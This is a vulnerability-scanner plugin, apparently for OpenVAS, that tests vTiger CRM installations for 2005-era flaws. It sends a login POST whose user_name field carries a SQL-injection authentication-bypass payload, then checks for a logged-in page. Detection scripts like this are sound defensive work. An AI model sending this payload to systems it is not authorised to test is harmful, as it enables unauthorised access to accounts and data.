# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:vtiger:vtiger_crm";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20317");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3818", "CVE-2005-3819", "CVE-2005-3820", "CVE-2005-3821", "CVE-2005-3822",
                "CVE-2005-3823", "CVE-2005-3824");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("vTiger < 4.5 Alpha 2 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("gb_vtiger_crm_detect.nasl");
  script_mandatory_keys("vtiger/detected");

  script_tag(name:"summary", value:"vTiger is prone to arbitrary code execution, directory
  traversal, SQL injection (allowing authentication bypass) and cross-site scripting (XSS)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"solution", value:"Update to vTiger version 4.5 alpha 2 or later.");

  script_xref(name:"URL", value:"http://www.hardened-php.net/advisory_232005.105.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/15562");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/15569");
  script_xref(name:"URL", value:"http://www.sec-consult.com/231.html");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:port);
filename = dir +  "/index.php";
variables = "module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name=admin%27+or+%271%27%3D%271&user_password=test&login_theme=blue&login_language=en_us&Login=++Login++";

req = string("POST ", filename, " HTTP/1.0\r\n",
             "Referer: http://", host, filename, "\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(variables),
             "\r\n\r\n",
             variables);
result = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if(# Link to My Account
   "?module=Users&action=DetailView&record=" >< result ||
   "New Contact" >< result) {
  security_message(port:port);
  exit(0);
}

exit(99);
